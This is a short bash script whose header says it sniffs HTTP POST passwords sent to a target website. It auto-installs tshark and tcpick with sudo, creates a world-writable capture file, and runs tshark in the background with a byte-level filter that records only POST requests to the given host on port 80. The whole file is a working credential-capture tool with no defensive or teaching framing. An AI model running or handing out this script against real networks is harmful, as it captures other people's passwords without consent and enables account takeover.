#!/bin/bash
#=============================================================
# A simple shell script to start tshark and sniff the network
# Attempts to sniff out http-post password
# ----
# Note: Run this script with sudo privilege
#=============================================================

# Read in IP address of targeted website
HOST_IP=$1

# Check if tshark and tcpick is installed, if not install
if command -v tshark >/dev/null 2>&1 ; then
    echo "tshark found"
else
    echo "tshark not found, initiating download"
    sudo apt --assume-yes install tshark
fi

if command -v tcpick >/dev/null 2>&1 ; then
    echo "tcpick found"
else
    echo "tcpick not found, initiating download"
    sudo apt --assume-yes install tcpick
fi

# Setting up output file
FILE=./capture-output.pcapng
if test -f "$FILE"; then
    #output file exists
    rm $FILE
fi
touch capture-output.pcapng
chmod a+rw capture-output.pcapng

# Start tshark
sudo tshark -w $FILE -f "host $HOST_IP and port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504F5354" > /dev/null 2>&1 &

